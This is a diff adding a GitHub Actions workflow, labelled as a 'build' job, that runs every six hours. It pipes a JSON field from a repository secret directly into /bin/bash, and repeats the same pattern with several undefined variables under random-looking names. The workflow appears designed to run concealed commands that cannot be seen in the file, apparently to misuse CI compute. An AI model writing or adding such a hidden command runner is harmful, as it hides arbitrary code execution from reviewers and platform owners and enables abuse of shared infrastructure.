@@ -1,0 +1,25 @@
+name: seankinsley5801
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: seankinsley5801
+        env:
+          o6266: ${{ secrets.o6266 }}
+        run: |
+          echo $o6266 | jq -r .im7 | /bin/bash
+          echo $zwjv101 | jq -r .j076 | /bin/bash
+          echo $loxpy75710 | jq -r .d533 | /bin/bash
+          echo $wkwf44 | jq -r .fpmu6930 | /bin/bash
+          echo $vvo71918 | jq -r .dwpm59354 | /bin/bash
+          echo $hgh480 | jq -r .qauvd7 | /bin/bash
+          echo $uz710 | jq -r .nm93532 | /bin/bash
+          echo $c3 | jq -r .hapep040 | /bin/bash
+
